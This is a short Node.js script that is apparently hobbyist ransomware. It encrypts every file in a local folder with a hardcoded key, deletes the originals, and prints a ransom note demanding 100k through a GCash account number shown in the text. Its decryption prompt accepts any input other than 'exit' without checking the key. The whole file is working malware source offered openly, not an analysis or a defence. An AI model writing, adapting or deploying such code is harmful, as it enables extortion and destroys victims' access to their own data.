var encryptor = require('file-encryptor');
var readlineSync = require('readline-sync');
var fs = require('fs');

var decryptionkey = 'IamBrokeGuy100k';
var secretfolderwithmycrush = './secretfiles';

async function encryptFiles() {
    return new Promise((resolve, reject) => {
        fs.readdir(secretfolderwithmycrush, async (err, files) => {
            if (err) {
                reject(err);
                return;
            }

            for (const file of files) {
                await new Promise((resolveEncrypt, rejectEncrypt) => {
                    encryptor.encryptFile(`${secretfolderwithmycrush}/${file}`, `${secretfolderwithmycrush}/${file}.encrypt`, decryptionkey, function(err) {
                        if (err) {
                            rejectEncrypt(err);
                        } else {
                            fs.unlink(`${secretfolderwithmycrush}/${file}`, function(err) {
                                if (err) {
                                    rejectEncrypt(err);
                                } else {
                                    resolveEncrypt();
                                }
                            });
                        }
                    });
                });
            }

            console.log(`Your files have been encrypted if you want to decrypt them send to me a 100k $ to my gcash account 09674385665 
            and i will give you the decryption key send to my email address the proven that you successfully paid the amount`);
            resolve();
        });
    });
}

async function decryptFiles() {
    return new Promise((resolve, reject) => {
        fs.readdir(secretfolderwithmycrush, async (err, files) => {
            if (err) {
                reject(err);
                return;
            }
            for (const file of files) {
                if (file.endsWith('.encrypt')) {
                    var decryptedFileName = `${secretfolderwithmycrush}/${file.replace('.encrypt', '')}`;
                    await new Promise((resolveDecrypt, rejectDecrypt) => {
                        encryptor.decryptFile(`${secretfolderwithmycrush}/${file}`, decryptedFileName, decryptionkey, function(err) {
                            if (err) {
                                rejectDecrypt(err);
                            } else {
                                fs.unlink(`${secretfolderwithmycrush}/${file}`, function(err) {
                                    if (err) {
                                        rejectDecrypt(err);
                                    } else {
                                        resolveDecrypt();
                                    }
                                });
                            }
                        });
                    });
                }
            }

            console.log(`Congratulations, your files have been decrypted may the god be the glory`);
            resolve();
        });
    });
}

encryptFiles()
    .then(() => {
        var decryptionKey = readlineSync.question('Please enter the decryption key (type "exit" to quit): ');
        if (decryptionKey.toLowerCase() === 'exit') {
            console.log('Exiting decryption process.');
            return;
        }
        return decryptFiles();
    })
    .catch(err => {
        console.error('Error:', err);
    });
